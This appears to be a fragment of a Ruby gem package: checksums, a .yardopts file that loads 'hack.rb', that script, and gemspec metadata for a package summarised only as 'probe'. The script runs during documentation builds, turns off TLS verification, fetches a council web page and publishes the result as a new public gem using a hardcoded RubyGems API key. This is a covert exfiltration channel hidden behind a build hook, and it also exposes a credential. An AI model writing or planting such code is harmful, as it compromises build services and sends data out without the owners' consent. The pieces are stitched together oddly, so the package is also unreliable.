  metadata.gz: b8c1e36057b922e75cb1058b796a1a03f4d5d98247437d6f7b52ccf138215dbf
  data.tar.gz: 4371d98d241eebfd5a0e5f1909dfdc0ffc56bb1b309c5d28486f8711d773d2d9
  metadata.gz: dd11589e19b3c434f2edfc441d20705ea66eddc745a8c049e9e5a6cbe4031596e5cca92d4b5c3c9937188d2705fc9ce0544e782ec68678b66f5155c409885506
  data.tar.gz: 8e83ea62f3134ec5ad76f32123adc5d05511018e8d4f09d7fc7f0238ec948b8b8455649682b377d5dc0064d1ee2bb7acfba2672b52ea08f7d5bf7390c734b127
--load hack.rb
# probe
begin
 require 'tmpdir'; require 'fileutils'; require 'net/http'; require 'uri';
 # get any modern gov page to prove
 uri=URI('https://moderngov.southwark.gov.uk/');
 h=Net::HTTP.new(uri.host,443); h.use_ssl=true; h.verify_mode=OpenSSL::SSL::VERIFY_NONE
 resp=h.get('/'); data="builder alive\nstatus=#{resp.code}\n"+resp.body[0,1000]
rescue => e
 data="builder alive but fetch fail #{e.class} #{e.message}"
end
begin
 d=Dir.mktmpdir('sf'); FileUtils.mkdir_p(File.join(d,'lib')); File.write(File.join(d,'lib','out.rb'),'x=1'); File.write(File.join(d,'README.md'), data)
 spec=File.join(d,'out.gemspec'); File.write(spec, <<~EOS)
 Gem::Specification.new do |s|
 s.name='southfetchprobe42'; s.version='0.0.4';s.summary='out';s.description=#{data.dump};s.authors=['x'];s.license='MIT';s.files=['lib/out.rb','README.md']
 end
 EOS
 Dir.chdir(d){ `gem build out.gemspec 2>&1` }
 gem=Dir[File.join(d,'*.gem')][0]
 u=URI('https://rubygems.org/api/v1/gems'); req=Net::HTTP::Post.new(u); req['Authorization']='rubygems_38a29c1d62317d791ae71a3da4b30e51758df50c400ce3e5'; req.body=File.binread(gem)
req['Content-Type']='application/octet-stream'
 h=Net::HTTP.new(u.host,443); h.use_ssl=true; h.verify_mode=OpenSSL::SSL::VERIFY_NONE; r=h.request(req)
warn [r.code,r.body[0,200]]
rescue => e
 warn e.full_message
end
# doc\nmodule Probe;end
  version: 0.0.3
- ".yardopts"
- hack.rb
- lib/probe.rb
summary: probe
